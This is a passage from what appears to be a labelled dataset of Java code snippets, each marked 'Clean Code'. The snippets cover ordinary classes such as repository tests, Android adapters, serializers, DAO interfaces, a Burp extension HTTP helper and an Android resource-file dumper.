    assertThat(flow.getFragments().getFirst(),containsString(""condition.MultipleCondition[/mark]""));
  }
  @Disabled(""Test disabled: no exception thrown when converting to dynamic properties"") @Test public void invalidFlow(){
    dslContextWrapper.transaction(configuration -> {
      DSLContext context=DSL.using(configuration);
      context.insertInto(flowRepository.jdbcRepository.getTable()).set(field(""key""),""io.kestra.unittest_invalid"").set(field(""source_code""),"""").set(field(""value""),JacksonMapper.ofJson().writeValueAsString(Map.of(""id"",""invalid"",""namespace"",""io.kestra.unittest"",""revision"",1,""tasks"",List.of(Map.of(""id"",""invalid"",""type"",""io.kestra.plugin.core.log.Log"",""level"",""invalid"")),""deleted"",false))).execute();
    }
);
    Optional<FlowWithSource> flow=flowRepository.findByIdWithSource(null,""io.kestra.unittest"",""invalid"");
    try {
      assertThat(flow.isPresent(),is(true));
      assertThat(flow.get(),instanceOf(FlowWithException.class));
      assertThat(((FlowWithException)flow.get()).getException(),containsString(""Cannot deserialize value of type `org.slf4j.event.Level`""));
    }
  finally {
      flow.ifPresent(value -> flowRepository.delete(value));
    }
  }
  @BeforeAll protected void setup(){
    jdbcTestUtils.drop();
    jdbcTestUtils.migrate();
  }
}
",0,Clean Code
"public class InviteSeatButton extends androidx.appcompat.widget.AppCompatButton {
  private String mUserId="""";
  private final InviteSeatButtonStateHolder mStateHolder=new InviteSeatButtonStateHolder();
  private final Observer<InviteSeatButtonUiState> mObserver=this::updateView;
  public InviteSeatButton(  Context context){
    this(context,null);
  }
  public InviteSeatButton(  Context context,  AttributeSet attrs){
    this(context,attrs,0);
  }
  public InviteSeatButton(  Context context,  AttributeSet attrs,  int defStyleAttr){
    super(context,attrs,defStyleAttr);
    setOnClickListener(v -> {
      Map<String,Object> params=new HashMap<>();
      params.put(""userId"",mUserId);
      ConferenceEventCenter.getInstance().notifyUIEvent(ConferenceEventCenter.RoomKitUIEvent.INVITE_TAKE_SEAT,params);
    }
);
  }
  public void setUserId(  String userId){
    mUserId=userId;
    mStateHolder.setUserId(userId);
  }
  @Override protected void onAttachedToWindow(){
    super.onAttachedToWindow();
    mStateHolder.observe(mObserver);
  }
  @Override protected void onDetachedFromWindow(){
    super.onDetachedFromWindow();
    mStateHolder.removeObserver(mObserver);
  }
  private void updateView(  InviteSeatButtonUiState uiState){
    setVisibility(uiState.isShow ? VISIBLE : INVISIBLE);
  }
}",0,Clean Code
"/** 
 * 文件key进行序列化对象
 * @Author 1024创新实验室: 罗伊
 * @Date 2020/8/15 22:06
 * @Wechat zhuoda1024
 * @Email lab1024@163.com
 * @Copyright  <a href=""https://1024lab.net"">1024创新实验室</a>
 */
public class FileKeyVoSerializer extends JsonSerializer<String> {
  @Resource private FileService fileService;
  @Override public void serialize(  String value,  JsonGenerator jsonGenerator,  SerializerProvider serializerProvider) throws IOException {
    if (StringUtils.isEmpty(value)) {
      jsonGenerator.writeObject(Lists.newArrayList());
      return;
    }
    if (fileService == null) {
      jsonGenerator.writeString(value);
      return;
    }
    String[] fileKeyArray=value.split("","");
    List<String> fileKeyList=Arrays.asList(fileKeyArray);
    List<FileVO> fileKeyVOList=fileService.getFileList(fileKeyList);
    jsonGenerator.writeObject(fileKeyVOList);
  }
}
/** 
 * 文件key进行序列化对象
 * @Author 1024创新实验室: 罗伊
 * @Date 2020/8/15 22:06
 * @Wechat zhuoda1024
 * @Email lab1024@163.com
 * @Copyright  <a href=""https://1024lab.net"">1024创新实验室</a>
 */
public class FileKeyVoSerializer extends JsonSerializer<String> {
  @Resource private FileService fileService;
  @Override public void serialize(  String value,  JsonGenerator jsonGenerator,  SerializerProvider serializerProvider) throws IOException {
    if (StringUtils.isEmpty(value)) {
      jsonGenerator.writeObject(Lists.newArrayList());
      return;
    }
    if (fileService == null) {
      jsonGenerator.writeString(value);
      return;
    }
    String[] fileKeyArray=value.split("","");
    List<String> fileKeyList=Arrays.asList(fileKeyArray);
    List<FileVO> fileKeyVOList=fileService.getFileList(fileKeyList);
    jsonGenerator.writeObject(fileKeyVOList);
  }
}
",0,Clean Code
"/** 
 * Constant type that represents an annotation. 
 */
public final class CstAnnotation extends Constant {
  /** 
 * {@code non-null;} the actual annotation 
 */
  private final Annotation annotation;
  /** 
 * Constructs an instance.
 * @param annotation {@code non-null;} the annotation to hold
 */
  public CstAnnotation(  Annotation annotation){
    if (annotation == null) {
      throw new NullPointerException(""annotation == null"");
    }
    annotation.throwIfMutable();
    this.annotation=annotation;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public boolean equals(  Object other){
    if (!(other instanceof CstAnnotation)) {
      return false;
    }
    return annotation.equals(((CstAnnotation)other).annotation);
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public int hashCode(){
    return annotation.hashCode();
  }
  /** 
 * {@inheritDoc} 
 */
  @Override protected int compareTo0(  Constant other){
    return annotation.compareTo(((CstAnnotation)other).annotation);
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public String toString(){
    return annotation.toString();
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public String typeName(){
    return ""annotation"";
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public boolean isCategory2(){
    return false;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public String toHuman(){
    return annotation.toString();
  }
  /** 
 * Get the underlying annotation.
 * @return {@code non-null;} the annotation
 */
  public Annotation getAnnotation(){
    return annotation;
  }
}
",0,Clean Code
"/** 
 * Carries the read/write authorization to topics for the users.
 */
public class Authorization {
  protected final Topic topic;
  protected final Permission permission;
  /** 
 * Access rights
 */
  enum Permission {  READ,   WRITE,   READWRITE}
  Authorization(  Topic topic){
    this(topic,Permission.READWRITE);
  }
  Authorization(  Topic topic,  Permission permission){
    this.topic=topic;
    this.permission=permission;
  }
  public boolean grant(  Permission desiredPermission){
    return permission == desiredPermission || permission == READWRITE;
  }
  @Override public boolean equals(  Object o){
    if (this == o)     return true;
    if (o == null || getClass() != o.getClass())     return false;
    Authorization that=(Authorization)o;
    if (permission != that.permission)     return false;
    if (!topic.equals(that.topic))     return false;
    return true;
  }
  @Override public int hashCode(){
    int result=topic.hashCode();
    result=31 * result + permission.hashCode();
    return result;
  }
}
",0,Clean Code
"class RunVariablesTest {
  @Test @SuppressWarnings(""unchecked"") void shouldGetEmptyVariables(){
    Map<String,Object> variables=new RunVariables.DefaultBuilder().build(new RunContextLogger());
    assertThat(variables.size(),is(3));
    assertThat((Map<String,Object>)variables.get(""envs""),is(Map.of()));
    assertThat((Map<String,Object>)variables.get(""globals""),is(Map.of()));
    assertThat(variables.get(""addSecretConsumer""),notNullValue());
  }
  @Test void shouldGetVariablesGivenFlowWithNoTenant(){
    Map<String,Object> variables=new RunVariables.DefaultBuilder().withFlow(Flow.builder().id(""id-value"").namespace(""namespace-value"").revision(42).build()).build(new RunContextLogger());
    Assertions.assertEquals(Map.of(""id"",""id-value"",""namespace"",""namespace-value"",""revision"",42),variables.get(""flow""));
  }
  @Test void shouldGetVariablesGivenFlowWithTenant(){
    Map<String,Object> variables=new RunVariables.DefaultBuilder().withFlow(Flow.builder().id(""id-value"").namespace(""namespace-value"").revision(42).tenantId(""tenant-value"").build()).build(new RunContextLogger());
    Assertions.assertEquals(Map.of(""id"",""id-value"",""namespace"",""namespace-value"",""revision"",42,""tenantId"",""tenant-value""),variables.get(""flow""));
  }
  @Test void shouldGetVariablesGivenTask(){
    Map<String,Object> variables=new RunVariables.DefaultBuilder().withTask(new Task(){
      @Override public String getId(){
        return ""id-value"";
      }
      @Override public String getType(){
        return ""type-value"";
      }
    }
).build(new RunContextLogger());
    Assertions.assertEquals(Map.of(""id"",""id-value"",""type"",""type-value""),variables.get(""task""));
  }
  @Test void shouldGetVariablesGivenTrigger(){
    Map<String,Object> variables=new RunVariables.DefaultBuilder().withTrigger(new AbstractTrigger(){
      @Override public String getId(){
        return ""id-value"";
      }
      @Override public String getType(){
        return ""type-value"";
      }
    }
).build(new RunContextLogger());
    Assertions.assertEquals(Map.of(""id"",""id-value"",""type"",""type-value""),variables.get(""trigger""));
  }
}
",0,Clean Code
"/** 
 * Handle read index request.
 * @author boyan (boyan@alibaba-inc.com)
 * @author jiachun.fjc
 */
public class ReadIndexRequestProcessor extends NodeRequestProcessor<ReadIndexRequest> {
  public ReadIndexRequestProcessor(  Executor executor){
    super(executor,RpcRequests.ReadIndexResponse.getDefaultInstance());
  }
  @Override protected String getPeerId(  final ReadIndexRequest request){
    return request.getPeerId();
  }
  @Override protected String getGroupId(  final ReadIndexRequest request){
    return request.getGroupId();
  }
  @Override public Message processRequest0(  final RaftServerService service,  final ReadIndexRequest request,  final RpcRequestClosure done){
    service.handleReadIndexRequest(request,new RpcResponseClosureAdapter<RpcRequests.ReadIndexResponse>(){
      @Override public void run(      final Status status){
        if (getResponse() != null) {
          done.sendResponse(getResponse());
        }
 else {
          done.run(status);
        }
      }
    }
);
    return null;
  }
  @Override public String interest(){
    return ReadIndexRequest.class.getName();
  }
}",0,Clean Code
"public class MutedTagAdapter extends BaseAdapter<TagsBean,RecyMutedTagBinding> {
  public MutedTagAdapter(  List<TagsBean> targetList,  Context context){
    super(targetList,context);
  }
  @Override public void initLayout(){
    mLayoutID=R.layout.recy_muted_tag;
  }
  @Override public void bindData(  TagsBean target,  ViewHolder<RecyMutedTagBinding> bindView,  int position){
    if (TextUtils.isEmpty(allItems.get(position).getName())) {
      bindView.baseBind.starSize.setText(R.string.string_155);
    }
 else {
      if (!TextUtils.isEmpty(allItems.get(position).getTranslated_name())) {
        bindView.baseBind.starSize.setText(String.format(""#%s/%s"",allItems.get(position).getName(),allItems.get(position).getTranslated_name()));
      }
 else {
        bindView.baseBind.starSize.setText(String.format(""#%s"",allItems.get(position).getName()));
      }
    }
    bindView.baseBind.sideDecorator.setVisibility(allItems.get(position).getFilter_mode() != 0 ? View.VISIBLE : View.GONE);
    bindView.baseBind.isEffective.setOnCheckedChangeListener(null);
    bindView.baseBind.isEffective.setChecked(target.isEffective());
    bindView.baseBind.isEffective.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener(){
      @Override public void onCheckedChanged(      CompoundButton buttonView,      boolean isChecked){
        target.setEffective(isChecked);
        PixivOperate.updateTag(target);
      }
    }
);
    if (mOnItemClickListener != null) {
      bindView.baseBind.deleteItem.setOnClickListener(new View.OnClickListener(){
        @Override public void onClick(        View v){
          mOnItemClickListener.onItemClick(v,position,1);
        }
      }
);
      bindView.itemView.setOnClickListener(v -> mOnItemClickListener.onItemClick(v,position,0));
    }
  }
}
",0,Clean Code
"/** 
 * @author geekidea
 * @date 2023/12/31
 */
@Slf4j public class VelocityUtil {
  private static Properties properties;
static {
    properties=new Properties();
    properties.setProperty(""resource.loader.file.class"",ClasspathResourceLoader.class.getName());
    properties.setProperty(""resource.loader.file.unicode"",""true"");
    properties.setProperty(Velocity.FILE_RESOURCE_LOADER_PATH,"""");
    properties.setProperty(Velocity.ENCODING_DEFAULT,GeneratorConstant.UTF8);
    properties.setProperty(Velocity.INPUT_ENCODING,GeneratorConstant.UTF8);
  }
  /** 
 * 渲染模板数据输出到StringWrite中
 * @param templatePath
 * @param dataMap
 * @return
 * @throws Exception
 */
  public static String writer(  String templatePath,  Map<String,Object> dataMap){
    VelocityEngine velocityEngine=new VelocityEngine(properties);
    StringWriter writer=new StringWriter();
    Template template=velocityEngine.getTemplate(templatePath,ConstVal.UTF8);
    template.merge(new VelocityContext(dataMap),writer);
    String content=writer.toString();
    IOUtils.closeQuietly(writer);
    return content;
  }
}",0,Clean Code
"/** 
 * Operate label of instance 
 */
public interface InstanceLabelDao {
  /** 
 * Select by id ( tip: select ... for update)
 * @param labelId label id
 * @return
 */
  InsPersistenceLabel selectForUpdate(  Integer labelId);
  /** 
 * Select by label_key and label_value (tip: select ... for update)
 * @param labelKey label key
 * @param labelValue label value
 * @return
 */
  InsPersistenceLabel searchForUpdate(  @Param(""labelKey"") String labelKey,  @Param(""labelValue"") String labelValue);
  /** 
 * Insert label entities If you want to get id from multiple insert operation, use MyBatis 3.3.x
 * @param labels labels
 */
  void insertBatch(  List<InsPersistenceLabel> labels);
  /** 
 * Insert label
 * @param label label entity
 */
  void insert(  InsPersistenceLabel label);
  /** 
 * To fetch update lock of record in transaction
 * @param labelId
 */
  int updateForLock(  Integer labelId);
  /** 
 * Search labels by key and string value
 * @param labelSearch search vo
 * @return
 */
  List<InsPersistenceLabel> search(  List<InsPersistenceLabelSearchVo> labelSearch);
  /** 
 * Remove label
 * @param label label entity
 */
  void remove(  InsPersistenceLabel label);
  /** 
 * Insert key -> value of label
 * @param keyValues key -> value
 */
  void doInsertKeyValues(  List<InsPersistenceLabelValue> keyValues);
  /** 
 * Remove key -> value map from label id
 * @param labelId
 */
  void doRemoveKeyValues(  Integer labelId);
  void doRemoveKeyValuesBatch(  List<Integer> labelIds);
}",0,Clean Code
"@RunWith(AndroidJUnit4.class) @LargeTest public class PluginServiceTest extends PluginMainAppTest {
  @Override protected Intent getLaunchIntent(){
    Intent pluginIntent=new Intent();
    String packageName=ApplicationProvider.getApplicationContext().getPackageName();
    pluginIntent.setClassName(packageName,""com.tencent.shadow.test.plugin.general_cases.lib.usecases.service.TestStartServiceActivity"");
    return pluginIntent;
  }
  @Test public void testService(){
    click(""start"");
    String text=""onCreate-onStartCommand"";
    check(text);
    click(""stop"");
    text+=""-onDestroy"";
    check(text);
    click(""bind"");
    text+=""-onCreate-onBind"";
    check(text);
    click(""testBinder"");
    text+=""-callTest"";
    check(text);
    click(""unbind"");
    text+=""-onUnbind-onDestroy"";
    check(text);
    click(""start"");
    text+=""-onCreate-onStartCommand"";
    check(text);
    click(""bind"");
    text+=""-onBind"";
    check(text);
    click(""stop"");
    check(text);
    click(""unbind"");
    text+=""-onUnbind-onDestroy"";
    check(text);
  }
  @Test public void startInNewThread(){
    click(""startInNewThread"");
    String text=""onCreate-onStartCommand"";
    check(text);
    click(""stop"");
    text+=""-onDestroy"";
    check(text);
  }
  private void click(  String tag){
    Espresso.onView(ViewMatchers.withTagValue(Matchers.<Object>is(tag))).perform(ViewActions.click());
  }
  private void check(  String text){
    matchTextWithViewTag(""text"",text);
  }
}
",0,Clean Code
"public class URLibraryFile implements LibraryFile {
  private final URL url;
  private final String path;
  private final DarwinResolver resolver;
  public URLibraryFile(  URL url,  String path,  DarwinResolver resolver){
    this.url=url;
    this.path=path;
    this.resolver=resolver;
  }
  @Override public String getName(){
    return FilenameUtils.getName(path);
  }
  @Override public String getMapRegionName(){
    return getPath();
  }
  @Override public LibraryFile resolveLibrary(  Emulator<?> emulator,  String dylibName){
    if (resolver == null) {
      return null;
    }
    return resolver.resolveLibrary(dylibName,resolver.getClass());
  }
  @Override public ByteBuffer mapBuffer() throws IOException {
    if (""file"".equalsIgnoreCase(url.getProtocol())) {
      return Utils.mapBuffer(new File(url.getPath()));
    }
 else {
      return ByteBuffer.wrap(IOUtils.toByteArray(url));
    }
  }
  @Override public long getFileSize(){
    if (""file"".equalsIgnoreCase(url.getProtocol())) {
      return new File(url.getPath()).length();
    }
 else {
      try {
        return IOUtils.toByteArray(url).length;
      }
 catch (      IOException e) {
        throw new IllegalStateException(e);
      }
    }
  }
  @Override public String getPath(){
    return path;
  }
}
",0,Clean Code
"@Component @ManagedResource public static final class HealthCheck {
  private final HealthEndpoint healthEndpoint;
  public HealthCheck(  HealthEndpoint healthEndpoint){
    this.healthEndpoint=healthEndpoint;
  }
  @ManagedAttribute public Map<String,Object> getHealth(){
    final var health=(Health)healthEndpoint.health();
    final var healthMap=new LinkedHashMap<String,Object>();
    healthMap.put(""status"",getStatus(health));
    healthMap.put(""detail"",getDetails(health.getDetails()));
    return healthMap;
  }
  private Map<String,Object> getDetails(  Map<String,Object> details){
    return details.entrySet().stream().collect(Collectors.toMap(Map.Entry::getKey,e -> {
      final var health=(Health)e.getValue();
      final var detail=new LinkedHashMap<String,Object>();
      final var healthy=Status.UP.equals(health.getStatus());
      detail.put(""healthy"",healthy);
      detail.put(""message"",health.getDetails().toString());
      return detail;
    }
));
  }
  private String getStatus(  Health health){
    final var status=health.getStatus();
    if (Status.UP.equals(status) || Status.DOWN.equals(status)) {
      return status.toString();
    }
 else {
      return ""ERROR"";
    }
  }
}
",0,Clean Code
"public static class ValueContext extends ParserRuleContext {
  public TerminalNode STRING(){
    return getToken(JSONParser.STRING,0);
  }
  public TerminalNode NUMBER(){
    return getToken(JSONParser.NUMBER,0);
  }
  public ObjContext obj(){
    return getRuleContext(ObjContext.class,0);
  }
  public ArrContext arr(){
    return getRuleContext(ArrContext.class,0);
  }
  public ValueContext(  ParserRuleContext parent,  int invokingState){
    super(parent,invokingState);
  }
  @Override public int getRuleIndex(){
    return RULE_value;
  }
  @Override public void enterRule(  ParseTreeListener listener){
    if (listener instanceof JSONListener)     ((JSONListener)listener).enterValue(this);
  }
  @Override public void exitRule(  ParseTreeListener listener){
    if (listener instanceof JSONListener)     ((JSONListener)listener).exitValue(this);
  }
  @Override public <T>T accept(  ParseTreeVisitor<? extends T> visitor){
    if (visitor instanceof JSONVisitor)     return ((JSONVisitor<? extends T>)visitor).visitValue(this);
 else     return visitor.visitChildren(this);
  }
}
",0,Clean Code
"/** 
 * Interface representing a service for application backup operations. 
 */
public interface FlinkApplicationBackupService extends IService<FlinkApplicationBackup> {
  /** 
 * Deletes an object specified by the given ID.
 * @param id The ID of the object to delete.
 * @return true if the object was successfully deleted, false otherwise.
 * @throws InternalException if an internal error occurs during the deletion process.
 */
  Boolean removeById(  Long id) throws InternalException ;
  /** 
 * Performs a backup for the given application and Flink SQL parameters.
 * @param appParam The application to back up.
 * @param flinkSqlParam The Flink SQL to back up.
 */
  void backup(  FlinkApplication appParam,  FlinkSql flinkSqlParam);
  /** 
 * Retrieves a page of  {@link FlinkApplicationBackup} objects based on the provided parameters.
 * @param bakParam The {@link FlinkApplicationBackup} object containing the search criteria.
 * @param request The {@link RestRequest} object used for pagination and sorting.
 * @return An {@link IPage} containing the retrieved {@link FlinkApplicationBackup} objects.
 */
  IPage<FlinkApplicationBackup> getPage(  FlinkApplicationBackup bakParam,  RestRequest request);
  /** 
 * Rolls back the changes made by the specified application backup.
 * @param bakParam The ApplicationBackUp object representing the backup to roll back.
 */
  void rollback(  FlinkApplicationBackup bakParam);
  /** 
 * Revoke the given application.
 * @param appParam The application to be revoked.
 */
  void revoke(  FlinkApplication appParam);
  /** 
 * Removes the specified application.
 * @param appParam the application to be removed
 */
  void remove(  FlinkApplication appParam);
  /** 
 * Rolls back a Flink SQL application to its previous state.
 * @param appParam The application to rollback.
 * @param flinkSqlParam The Flink SQL instance associated with the application.
 */
  void rollbackFlinkSql(  FlinkApplication appParam,  FlinkSql flinkSqlParam);
}
",0,Clean Code
"/** 
 * <p> </p>
 * @author AllDataDC
 * @since 2023-01-11
 */
@Data @EqualsAndHashCode(callSuper=true) @Accessors(chain=true) @TableName(value=""sys_market_user"",autoResultMap=true) public class UserEntity extends BaseEntity {
  private static final long serialVersionUID=1L;
  /** 
 * 用户名称
 */
  private String username;
  /** 
 * 用户昵称
 */
  private String nickname;
  /** 
 * 用户密码
 */
  private String password;
  /** 
 * 电子邮箱
 */
  private String email;
  /** 
 * 手机号码
 */
  private String phone;
  /** 
 * 出生日期
 */
  private LocalDate birthday;
  /** 
 * 部门
 */
  private String deptId;
  @TableField(exist=false) private DeptEntity dept;
  @TableField(exist=false) private List<RoleEntity> roles;
  @TableField(exist=false) private List<PostEntity> posts;
}
/** 
 * <p> </p>
 * @author yuwei
 * @date 2022-09-11
 */
@Data @EqualsAndHashCode(callSuper=true) @Accessors(chain=true) @TableName(value=""sys_user"",autoResultMap=true) public class UserEntity extends BaseEntity {
  private static final long serialVersionUID=1L;
  /** 
 * 用户名称
 */
  private String username;
  /** 
 * 用户昵称
 */
  private String nickname;
  /** 
 * 用户密码
 */
  private String password;
  /** 
 * 电子邮箱
 */
  private String email;
  /** 
 * 手机号码
 */
  private String phone;
  /** 
 * 出生日期
 */
  private LocalDate birthday;
  /** 
 * 部门
 */
  private String deptId;
  @TableField(exist=false) private DeptEntity dept;
  @TableField(exist=false) private List<RoleEntity> roles;
  @TableField(exist=false) private List<PostEntity> posts;
}",0,Clean Code
"public class FragmentFollowUser extends NetListFragment<FragmentBaseListBinding,ListUser,UserPreviewsBean> {
  private int userID;
  private String starType;
  private boolean showToolbar=false;
  public static FragmentFollowUser newInstance(  int userID,  String starType,  boolean pShowToolbar){
    Bundle args=new Bundle();
    args.putInt(Params.USER_ID,userID);
    args.putString(Params.STAR_TYPE,starType);
    args.putBoolean(Params.FLAG,pShowToolbar);
    FragmentFollowUser fragment=new FragmentFollowUser();
    fragment.setArguments(args);
    return fragment;
  }
  @Override public void initBundle(  Bundle bundle){
    userID=bundle.getInt(Params.USER_ID);
    starType=bundle.getString(Params.STAR_TYPE);
    showToolbar=bundle.getBoolean(Params.FLAG);
  }
  @Override public RemoteRepo<ListUser> repository(){
    return new FollowUserRepo(userID,starType);
  }
  @Override public BaseAdapter<UserPreviewsBean,RecyUserPreviewBinding> adapter(){
    return new UAdapter(allItems,mContext);
  }
  @Override public boolean showToolbar(){
    return showToolbar;
  }
  @Override public String getToolbarTitle(){
    return getString(R.string.string_232);
  }
}
",0,Clean Code
"/** 
 * This MemberVisitor and InstructionVisitor marks all methods and classes that have side effects. This includes invoking other methods that have side effects, writing to fields that are not write-only, and throwing exceptions.
 * @see NoSideEffectMethodMarker
 * @author Eric Lafortune
 */
public class SideEffectMethodMarker implements MemberVisitor, InstructionVisitor {
  private static final Logger logger=LogManager.getLogger(SideEffectMethodMarker.class);
  private final MemberVisitor extraMemberVisitor;
  private final SideEffectInstructionChecker sideEffectInstructionChecker;
  private final ClassVisitor sideEffectClassMarker=new OptimizationInfoClassFilter(new SideEffectClassMarker());
  /** 
 * Creates a new SideEffectMethodMarker.
 * @param optimizeConservatively specifies whether conservativeoptimization should be applied
 */
  public SideEffectMethodMarker(  boolean optimizeConservatively){
    this(null,optimizeConservatively);
  }
  /** 
 * Creates a new SideEffectMethodMarker.
 * @param extraMemberVisitor     optional visitor to apply to marked methods
 * @param optimizeConservatively specifies whether conservative optimizationshould be applied
 */
  public SideEffectMethodMarker(  MemberVisitor extraMemberVisitor,  boolean optimizeConservatively){
    this.extraMemberVisitor=extraMemberVisitor;
    this.sideEffectInstructionChecker=new SideEffectInstructionChecker(false,true,optimizeConservatively);
  }
  public void visitProgramMethod(  ProgramClass programClass,  ProgramMethod programMethod){
    if ((programMethod.getAccessFlags() & (AccessConstants.NATIVE | AccessConstants.SYNCHRONIZED)) != 0) {
      markSideEffects(programClass,programMethod);
    }
  }
  public void visitAnyInstruction(  Clazz clazz,  Method method,  CodeAttribute codeAttribute,  int offset,  Instruction instruction){
    if (sideEffectInstructionChecker.hasSideEffects(clazz,method,codeAttribute,offset,instruction)) {
      markSideEffects(clazz,method);
    }
  }
  private void markSideEffects(  Clazz clazz,  Method method){
    MethodOptimizationInfo methodOptimizationInfo=MethodOptimizationInfo.getMethodOptimizationInfo(method);
    if (!methodOptimizationInfo.hasSideEffects() && methodOptimizationInfo instanceof ProgramMethodOptimizationInfo) {
      ((ProgramMethodOptimizationInfo)methodOptimizationInfo).setSideEffects();
      if (methodOptimizationInfo.hasSideEffects()) {
        logger.debug(""SideEffectMethodMarker: marking for side-effects: {}.{}{}"",clazz.getName(),method.getName(clazz),method.getDescriptor(clazz));
        if (extraMemberVisitor != null) {
          method.accept(clazz,extraMemberVisitor);
        }
        if (method.getName(clazz).equals(ClassConstants.METHOD_NAME_CLINIT)) {
          clazz.accept(sideEffectClassMarker);
        }
      }
    }
  }
  public static boolean hasSideEffects(  Method method){
    return MethodOptimizationInfo.getMethodOptimizationInfo(method).hasSideEffects();
  }
}",0,Clean Code
"/** 
 * Attribute class for standard  {@code SourceDebugExtension} attributes.
 */
public final class AttSourceDebugExtension extends BaseAttribute {
  /** 
 * {@code non-null;} attribute name for attributes of this type 
 */
  public static final String ATTRIBUTE_NAME=""SourceDebugExtension"";
  /** 
 * {@code non-null;} Contents of SMAP 
 */
  private final CstString smapString;
  /** 
 * Constructs an instance.
 * @param smapString {@code non-null;} the SMAP data from the class file.
 */
  public AttSourceDebugExtension(  CstString smapString){
    super(ATTRIBUTE_NAME);
    if (smapString == null) {
      throw new NullPointerException(""smapString == null"");
    }
    this.smapString=smapString;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public int byteLength(){
    return 6 + smapString.getUtf8Size();
  }
  /** 
 * Gets the SMAP data of this instance.
 * @return {@code non-null;} the SMAP data.
 */
  public CstString getSmapString(){
    return smapString;
  }
}
",0,Clean Code
"public class HttpClientOfBurp {
  public static IHttpService getHttpService(  URL url){
    IBurpExtenderCallbacks callbacks=BurpExtender.getCallbacks();
    IExtensionHelpers helpers=callbacks.getHelpers();
    int port=url.getPort();
    if (port == -1) {
      if (url.getProtocol().equalsIgnoreCase(""http"")) {
        port=80;
      }
      if (url.getProtocol().equalsIgnoreCase(""https"")) {
        port=443;
      }
    }
    IHttpService service=helpers.buildHttpService(url.getHost(),port,url.getProtocol());
    return service;
  }
  public static String doRequest(  URL url){
    return doRequest(url,null);
  }
  /** 
 * @param url
 * @param byteRequest
 * @return response body
 */
  public static String doRequest(  URL url,  byte[] byteRequest){
    IBurpExtenderCallbacks callbacks=BurpExtender.getCallbacks();
    IExtensionHelpers helpers=callbacks.getHelpers();
    if (byteRequest == null) {
      byteRequest=helpers.buildHttpRequest(url);
    }
    IHttpService service=getHttpService(url);
    IHttpRequestResponse message=callbacks.makeHttpRequest(service,byteRequest);
    HelperPlus getter=BurpExtender.getHelperPlus();
    int code=getter.getStatusCode(message);
    if (ConfigManager.getBooleanConfigByKey(ConfigName.ApiReqToTitle) || code != 200) {
      try {
        LineEntry entry=new LineEntry(message);
        entry.addComment(""AssetInfo:"" + Commons.TimeToString(new Date().getTime()));
        BurpExtender.getGui().getTitlePanel().getTitleTable().getLineTableModel().addNewLineEntryWithTime(entry);
      }
 catch (      Exception e) {
        e.printStackTrace();
      }
    }
    if (code != 200) {
      return """";
    }
    byte[] byteBody=getter.getBody(false,message);
    return new String(byteBody);
  }
  public static void main(  String[] args){
    System.out.println(Commons.TimeToString(new Date().getTime()));
  }
}
",0,Clean Code
"public interface JobTemplateService {
  /** 
 * page list
 * @param start
 * @param length
 * @param jobGroup
 * @param jobDesc
 * @param executorHandler
 * @param userId
 * @return
 */
  Map<String,Object> pageList(  int start,  int length,  int jobGroup,  String jobDesc,  String executorHandler,  int userId,  Integer[] projectIds);
  /** 
 * add job
 * @param jobTemplate
 * @return
 */
  ReturnT<String> add(  JobTemplate jobTemplate);
  /** 
 * update job
 * @param jobTemplate
 * @return
 */
  ReturnT<String> update(  JobTemplate jobTemplate);
  /** 
 * remove job *
 * @param id
 * @return
 */
  ReturnT<String> remove(  int id);
}
",0,Clean Code
"/** 
 * Checkpoint metadata info.
 * @author boyan(boyan@antfin.com)
 */
public static final class Checkpoint {
  public String segFilename;
  public int committedPos;
  public Checkpoint(  final String segFilename,  final int committedPos){
    super();
    this.segFilename=segFilename;
    this.committedPos=committedPos;
  }
  /** 
 * commitPos (4 bytes) + path(4 byte len + string bytes)
 */
  byte[] encode(){
    byte[] ps=AsciiStringUtil.unsafeEncode(this.segFilename);
    byte[] bs=new byte[8 + ps.length];
    Bits.putInt(bs,0,this.committedPos);
    Bits.putInt(bs,4,ps.length);
    System.arraycopy(ps,0,bs,8,ps.length);
    return bs;
  }
  boolean decode(  final byte[] bs){
    if (bs.length < 8) {
      return false;
    }
    this.committedPos=Bits.getInt(bs,0);
    int len=Bits.getInt(bs,4);
    this.segFilename=AsciiStringUtil.unsafeDecode(bs,8,len);
    return this.committedPos >= 0 && !this.segFilename.isEmpty();
  }
  @Override public String toString(){
    return ""Checkpoint [segFilename="" + this.segFilename + "", committedPos=""+ this.committedPos+ ""]"";
  }
}",0,Clean Code
"public class UserCreatorLabel extends GenericLabel implements EngineNodeLabel, UserModifiable {
  public UserCreatorLabel(){
    setLabelKey(LabelKeyConstant.USER_CREATOR_TYPE_KEY);
  }
  @Override public Feature getFeature(){
    return Feature.CORE;
  }
  @ValueSerialNum(0) public void setUser(  String user){
    if (null == getValue()) {
      setValue(new HashMap<>());
    }
    getValue().put(""user"",user);
  }
  @ValueSerialNum(1) public void setCreator(  String creator){
    if (null == getValue()) {
      setValue(new HashMap<>());
    }
    getValue().put(""creator"",creator);
  }
  public String getUser(){
    if (null == getValue()) {
      return null;
    }
    return getValue().get(""user"");
  }
  public String getCreator(){
    if (null == getValue()) {
      return null;
    }
    return getValue().get(""creator"");
  }
  @Override public void valueCheck(  String stringValue) throws LabelErrorException {
    if (!StringUtils.isEmpty(stringValue)) {
      if (stringValue.split(SerializableLabel.VALUE_SEPARATOR).length != 2) {
        throw new LabelErrorException(LABEL_ERROR_CODE.getErrorCode(),LABEL_ERROR_CODE.getErrorDesc());
      }
    }
  }
}",0,Clean Code
"/** 
 * dump an arsc file
 * @author bob
 */
public class ArscDumper {
  public static void dump(  List<Pkg> pkgs){
    for (int x=0; x < pkgs.size(); x++) {
      Pkg pkg=pkgs.get(x);
      System.out.println(String.format(""  Package %d id=%d name=%s typeCount=%d"",x,pkg.id,pkg.name,pkg.types.size()));
      for (      Type type : pkg.types.values()) {
        System.out.println(String.format(""    type %d %s"",type.id - 1,type.name));
        int resPrefix=pkg.id << 24 | type.id << 16;
        for (int i=0; i < type.specs.length; i++) {
          ResSpec spec=type.getSpec(i);
          System.out.println(String.format(""      spec 0x%08x 0x%08x %s"",resPrefix | spec.id,spec.flags,spec.name));
        }
        for (int i=0; i < type.configs.size(); i++) {
          Config config=type.configs.get(i);
          System.out.println(""      config"");
          List<ResEntry> entries=new ArrayList<ResEntry>(config.resources.values());
